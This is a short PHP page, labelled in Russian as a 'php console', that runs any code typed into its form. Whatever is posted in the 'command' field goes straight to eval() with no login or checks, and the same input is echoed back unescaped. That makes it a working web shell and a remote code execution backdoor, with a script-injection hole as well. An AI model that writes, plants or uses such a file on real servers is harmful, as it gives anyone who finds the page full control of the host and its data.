<!DOCTYPE html>
<html lang="ru">
<head>
<title>php консоль</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<script src="http://code.jquery.com/jquery-latest.js"></script>
</head>
<body>
	<form method="post">
<textarea style="width:100%; height:300px;" name="command"><?php
if(isset($_POST['command'])) {
	print $_POST['command'];
}
?>
</textarea><br>
		<input type="submit" value="Выполнить">
	</form><br>
	<?php
	if(isset($_POST['command'])) {
		eval($_POST['command']);
	}
	?>
</body>
</html>